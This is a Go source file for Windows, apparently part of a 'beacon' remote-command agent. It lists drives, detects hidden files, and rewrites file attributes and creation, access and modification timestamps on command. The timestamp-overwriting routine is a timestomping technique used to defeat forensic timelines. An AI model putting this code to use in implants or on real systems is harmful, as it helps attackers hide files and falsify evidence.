//go:build windows

package command

import (
	"beacon/pkg/utils/packet"
	"fmt"
	"syscall"
	"time"
	"unsafe"
)

var (
	modkernel32            = syscall.NewLazyDLL("kernel32.dll")
	procGetLogicalDrives   = modkernel32.NewProc("GetLogicalDrives")
	procGetFileAttributesW = modkernel32.NewProc("GetFileAttributesW")
	procGetFileTime        = modkernel32.NewProc("GetFileTime")
)

const (
	FILE_ATTRIBUTE_HIDDEN       = 0x2
	FILE_READ_ATTRIBUTES        = 0x0080
	FILE_FLAG_BACKUP_SEMANTICS  = 0x02000000
)

func listWindowsDrives() ([]any, error) {
	// 调用 GetLogicalDrives
	r1, _, err := procGetLogicalDrives.Call()
	if r1 == 0 {
		return nil, err
	}
	bitmask := uint32(r1)

	var drives []string
	for i := 0; i < 26; i++ {
		if bitmask&(1<<uint(i)) != 0 {
			drive := string(rune('A'+i)) + ":\\"
			drives = append(drives, drive)
		}
	}

	// 每项 8 个字段：Name, Path, IsDir, Size, ModTime, Permission, Owner, IsHidden
	// 不在此写入 Count，由调用方 FileBrowser 控制
	results := make([]any, 0, len(drives)*8)

	for _, drive := range drives {
		// 统一使用 packet.PackBytes 处理字符串数据
		results = append(results, 
			packet.PackBytes([]byte(drive)),             // Name
			packet.PackBytes([]byte(drive)),             // Path
			true,                                        // IsDir
			int64(0),                                    // Size
			int64(0),                                    // ModTime
			packet.PackBytes([]byte("drwx------")),      // Permission
			packet.PackBytes([]byte("SYSTEM")),          // Owner
			false,                                       // IsHidden
		)
	}

	return results, nil
}

func isFileHidden(path string) bool {
	pathPtr, err := syscall.UTF16PtrFromString(path)
	if err != nil {
		return false
	}

	// 调用 GetFileAttributesW
	r1, _, _ := procGetFileAttributesW.Call(uintptr(unsafe.Pointer(pathPtr)))
	if r1 == 0xffffffff { // INVALID_FILE_ATTRIBUTES
		return false
	}
	return uint32(r1)&FILE_ATTRIBUTE_HIDDEN != 0
}

func getFileOwner(path string) string {
	// 简化实现，Windows 下暂时返回固定值
	return "N/A"
}

// applyPlatformAttributes 执行 Windows 特有的属性修改
func applyPlatformAttributes(path string, flag int, cTime int64, winAttrs uint32, linuxMode uint32, mTime, aTime int64) error {
	pathPtr, err := syscall.UTF16PtrFromString(path)
	if err != nil {
		return err
	}

	// 1. 设置 Windows 文件属性 (隐藏、只读等) - Bit 16
	if flag&16 != 0 {
		if err := syscall.SetFileAttributes(pathPtr, winAttrs); err != nil {
			return err
		}
	}

	// 2. 时间戳操作：如果涉及 M/A/C 任何一位，都启用极致覆盖逻辑
	if flag&2 != 0 || flag&4 != 0 || flag&8 != 0 {
		// 以可读写属性权限打开句柄。
		// FILE_FLAG_BACKUP_SEMANTICS 保证了可以打开目录进行操作。
		handle, err := syscall.CreateFile(
			pathPtr,
			syscall.FILE_WRITE_ATTRIBUTES|FILE_READ_ATTRIBUTES,
			syscall.FILE_SHARE_READ|syscall.FILE_SHARE_WRITE|syscall.FILE_SHARE_DELETE,
			nil,
			syscall.OPEN_EXISTING,
			FILE_FLAG_BACKUP_SEMANTICS,
			0,
		)
		if err != nil {
			return err
		}
		defer syscall.CloseHandle(handle)

		// A. 先获取文件由于系统维护的真实原始时间，防止“副作用”污染
		var ct, at, wt syscall.Filetime
		r, _, err := procGetFileTime.Call(uintptr(handle), uintptr(unsafe.Pointer(&ct)), uintptr(unsafe.Pointer(&at)), uintptr(unsafe.Pointer(&wt)))
		if r == 0 {
			return fmt.Errorf("failed to get original file time: %v", err)
		}

		// B. 根据位掩码，只修改被指定的具体维度
		if flag&8 != 0 { // Creation Time
			ct = syscall.NsecToFiletime(time.Unix(cTime, 0).UnixNano())
		}
		if flag&4 != 0 { // Access Time
			at = syscall.NsecToFiletime(time.Unix(aTime, 0).UnixNano())
		}
		if flag&2 != 0 { // Write/Modification Time
			wt = syscall.NsecToFiletime(time.Unix(mTime, 0).UnixNano())
		}

		// C. 一次性写回，确保原子性与保真度
		if err := syscall.SetFileTime(handle, &ct, &at, &wt); err != nil {
			return err
		}
	}

	return nil
}
